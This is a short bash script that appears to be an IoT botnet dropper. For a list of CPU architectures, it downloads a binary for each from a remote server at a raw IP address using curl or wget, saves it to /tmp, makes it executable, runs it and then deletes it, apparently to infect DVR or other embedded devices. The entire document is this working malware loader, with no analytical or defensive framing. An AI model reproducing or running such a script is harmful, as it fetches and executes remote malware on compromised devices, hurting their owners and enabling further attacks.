#!/bin/bash
WEBSERVER="http://163.123.143.216/stuff"
BINARIES="mips mpsl mips64 arm4l arm5l arm6l arm7l sh4 spc x86 ppc i686 m68k x86_64"

for Binary in $BINARIES; do
    (curl -o /tmp/dvrdevice $WEBSERVER/$Binary || wget $WEBSERVER/$Binary -O - > /tmp/dvrdevice)
    chmod 777 /tmp/dvrdevice
    /tmp/dvrdevice $Binary/$1
    rm -rf /tmp/dvrdevice
done
